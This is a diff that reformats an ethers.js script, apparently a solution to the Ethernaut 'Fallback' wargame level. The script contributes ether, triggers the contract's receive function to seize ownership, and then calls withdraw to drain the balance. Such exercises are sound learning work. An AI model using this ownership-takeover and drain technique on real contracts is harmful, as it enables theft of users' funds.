@@ -80,7 +80,8 @@ const fs = require('fs')
 require('dotenv').config({ path: './.env' })
 
 /**
- * Initialize the basic Ethers objects needed to interact with the blockchain and contract.
+ * Initialize the basic Ethers objects needed to interact with the blockchain 
+ * and contract.
  */
 async function setup(contractName) {
   // Create provider - a read-only abstraction to access blockchain data
@@ -104,8 +105,13 @@ async function setup(contractName) {
  * Run contract exploit.
  */
 async function main() {
-  // Get the basic Ethers objects needed to interact with the blockchain and contract
-  const { provider, playerWallet, playerWalletSigner, contract: fallbackContract } = setup('Fallback')
+  // Get basic Ethers objects needed to interact with the blockchain and contract
+  const { 
+  provider,
+    playerWallet, 
+    playerWalletSigner, 
+    contract: fallbackContract 
+  } = setup('Fallback')
   
   // Contribute 0.0001 ether via Fallback contract's 'contribute' function
   const contributionValue = ethers.utils.parseEther('0.0001')
@@ -115,10 +121,14 @@ async function main() {
   }).wait(1)
 
   // Confirm contribution via Fallback contract's 'getContribution' function
-  console.log(`Current contribution: ${await fallbackContract.getContribution().toString()}`)
+  console.log(
+    `Current contribution: ${await fallbackContract.getContribution().toString()}`
+  )
 
   // Send ether to Fallback contract address ('receive' function)
-  console.log(`Sending ${contributionValue.toString()} to Fallback contract address...`)
+  console.log(
+    `Sending ${contributionValue.toString()} to Fallback contract address...`
+  )
   await playerWalletSigner.sendTransaction({
     to: process.env.CONTRACT_ADDRESS,
     value: contributionValue,
@@ -137,7 +147,9 @@ async function main() {
     await fallbackContract.withdraw().wait(1)
 
     // Check new Fallback contract balance
-    const contractBalance = await provider.getBalance(process.env.CONTRACT_ADDRESS)
+    const contractBalance = await provider.getBalance(
+      process.env.CONTRACT_ADDRESS
+    )
     console.log(`Contract balance is now: ${contractBalance.toString()}`)
   }
 }
